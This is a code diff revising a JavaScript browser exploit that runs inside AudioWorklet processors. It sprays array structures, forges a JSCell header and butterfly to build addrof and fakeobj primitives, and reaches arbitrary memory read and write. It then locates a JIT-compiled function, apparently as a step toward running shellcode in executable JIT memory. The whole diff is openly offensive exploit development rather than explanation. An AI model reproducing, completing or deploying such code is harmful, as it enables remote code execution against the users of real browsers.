@@ -168,6 +168,14 @@ for(var i = 0; i < 0x10000; i++){
     };
 }
 
+var structure_spray = []
+for (var i = 0; i < 1000; ++i) {
+    var ary = [13.37];
+    ary.prop = 13.37;
+    ary['p'+i] = 13.37;
+    structure_spray.push(ary);
+}
+var victim1 = structure_spray[0];
 
 `); //sprayed doubled array flags and butterfly is victim aka evil_arr
 function makeJITCompiledFunction() {
@@ -193,23 +201,23 @@ function makeJITCompiledFunction() {
     }
     return target;
 }
-        var shellcodeFunc = makeJITCompiledFunction();
+var shellcodeFunc = makeJITCompiledFunction();
 
 b.process = (inputs, outputs, parameters)=>{
    
-    var structure_spray = []
+    /*var structure_spray = []
     var i = 0;
     var ary = [13.37];
     ary.prop = 1234;
     ary['p'+i] = 13.37;
-    structure_spray.push(ary);
+    structure_spray.push(ary);*/
     //structure_spray.push(ary);
     //structure_spray.push(ary);
     //structure_spray.push(ary);
 
     
 
-var victim1 = structure_spray[1];
+//var victim1 = structure_spray[1];
     if(stage == "leak"){
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
         expected_ptr = Number(expected_ptr);
@@ -270,9 +278,9 @@ var victim1 = structure_spray[1];
             //stage = "leak";
             return false;
         }
-        fuck.port.postMessage("double struc id : " + structure_id)
+        fuck.port.postMessage("double struc id : " + hex(structure_id))
         fuck.port.postMessage(`double array jscell header : ${hex1(floatAsQword(jscell_header)).toString(16)}`);
-        fuck.port.postMessage("contigous struc id : " + contigousid)
+        fuck.port.postMessage("contigous struc id : " + hex(contigousid))
         fuck.port.postMessage("array contigous jscell_header" + hex1(floatAsQword(contigousflags)).toString(16))
         fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
         //return false;
@@ -320,12 +328,12 @@ var victim1 = structure_spray[1];
             return boxed[0];
         }
         var outer = {
-        header: jscell_header, // cell
+        header: qwordAsFloat((0x00010800 * 0x100000000) + structure_id), //jscell_header+structure_id, // cell
         butterfly: victim1, // butterfly
-    };
+        };
         var boxed1 = [{}];
-        var unboxed1 = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
-        unboxed1[0] = 13.37;
+        var unboxed1 = [`${'13.37,'.repeat(100)}`];
+        unboxed1[0] = 4.2; //no cow double array
         var hax = fakeObj(addrof1(outer) + 0x10);
         fuck.port.postMessage("we got hax arb r/w obj!!!");
         hax[1] = unboxed1;
@@ -334,6 +342,10 @@ var victim1 = structure_spray[1];
         hax[1] = boxed1;
         victim1[1] = qwordAsFloat(shared);
         outer.header = jscell_header;
+        //boxed = null;
+        //unboxed = null;
+        //fuck.port.postMessage("cleared previous boxed and unboxed")
+
         //var origButterfly = hax[1];
 
         //fuck.port.postMessage("here" + addrof1(new Uint8Array(8)))
@@ -342,7 +354,7 @@ var victim1 = structure_spray[1];
         var memory = {
         addrof: function(victim) {
             boxed1[0] = victim1;
-            return hex(floatAsQword(unboxed1[0]));
+            return floatAsQword(unboxed1[0]);
         },
 
         fakeobj: function(addr) {
@@ -400,8 +412,8 @@ var victim1 = structure_spray[1];
 
             return a
         },
-
-        // Verify that memory read and write primitives work.
+        //fuck.port.postMessage(memory.read({a:0x4141414141},0x10))
+        /*// Verify that memory read and write primitives work.
         test() {
             var v = {};
             var obj = {p: v};
@@ -417,32 +429,35 @@ var victim1 = structure_spray[1];
             var value = this.read64(propertyAddr);
             fuck.port.postMessage(value + "vs" + addrof(v))
             //assert(qwordAsFloat(value) == qwordAsFloat(addrof(v)), "read64 does not work");
-        },
+        },*/
     }
 
-
+        memory.write(0x414141414141,0x414141414141);
         //memory.test();
         
         //var shared_butterfly = floatAsQword(e[1]);
         //memory.adr
+        //fuck.port.postMessage(hex(memory.fakeobj(memory.addrof({a:0x4141414141})).a))
         fuck.port.postMessage("we full stable arb r/w !!!");
+        //let z = new ArrayBuffer(1000) = memory;
+        //fuck.port.postMessage(z)
 
         
         
-        var shellcodeFuncAddr = memory.addrof(Math.sin);
-        fuck.port.postMessage("[+] Shellcode function @ " + shellcodeFuncAddr);
+        var shellcodeFuncAddr = hex1(memory.addrof(shellcodeFunc));
+        fuck.port.postMessage("[+] Shellcode function @ " + shellcodeFuncAddr >> 5);
         
-        //var executableAddr = memory.read64(shellcodeFuncAddr + (3*8)); //3*8
-        //fuck.port.postMessage("[+] Executable instance @ " + executableAddr);
+        //var executableAddr = memory.read64(shellcodeFuncAddr+24); //3*8
+        //fuck.port.postMessage("[+] Executable instance @ " + hex1(executableAddr));
         
         //var jitCodeAddr = memory.read64(executableAddr + (3*8)); //3*8
-        //fuck.port.postMessage("[+] JITCode instance @ " + jitCodeAddr);
+        //fuck.port.postMessage("[+] JITCode instance @ " + hex(jitCodeAddr));
         
         //var rwxMemAddr = memory.read64(jitCodeAddr + (4*8)); //4*8
         //rwxMemAddr = rwxMemAddr;
         //printFunc("[+] " + (rwx === true ? "RWX" : "RX") + " memory @ " + rwxMemAddr);
         stage="gc_test"
-        return false;
+        return true;
     }
     else if(stage=="gc_test"){
         gc();
@@ -453,9 +468,12 @@ var victim1 = structure_spray[1];
     //  sleep(2000);
     return true;
 }
-class OrigineWorklet extends AudioWorkletProcessor {
+/*class OrigineWorklet extends AudioWorkletProcessor {
     constructor(){
         super();
+        this.port.onmessage = (e) => {
+
+        }
         //var fuck2 = new AudioWorkletProcessor();
         return b;
     }
@@ -466,12 +484,17 @@ class OrigineWorklet extends AudioWorkletProcessor {
         
         return false;
     }
-}
+}*/
+//var z = [];
+
 class OrigineWorklet2 extends AudioWorkletProcessor {
     constructor(){
         super();
         //console.log(c);
         this.port.onmessage = (e)=>{
+            if(e.data == Object) {
+                port.postMessage("successfully transported div element as obj")
+            }
         }
         
         fuck = this;
@@ -491,5 +514,25 @@ class OrigineWorklet2 extends AudioWorkletProcessor {
         return false;
     }
 }
+
+class OrigineWorklet extends AudioWorkletProcessor {
+    constructor(){
+        super();
+        this.port.onmessage = (e) => {
+            fuck.port.postMessage("got message in Worklet1" + typeof e.data)
+
+        }
+        //var fuck2 = new AudioWorkletProcessor();
+        return b;
+    }
+    static get parameterDescriptors() {
+        return []
+    }
+    process (inputs, outputs, parameters) {
+        
+        return false;
+    }
+}
+
 registerProcessor('OrigineWorklet', OrigineWorklet);
 registerProcessor('OrigineWorklet2', OrigineWorklet2);
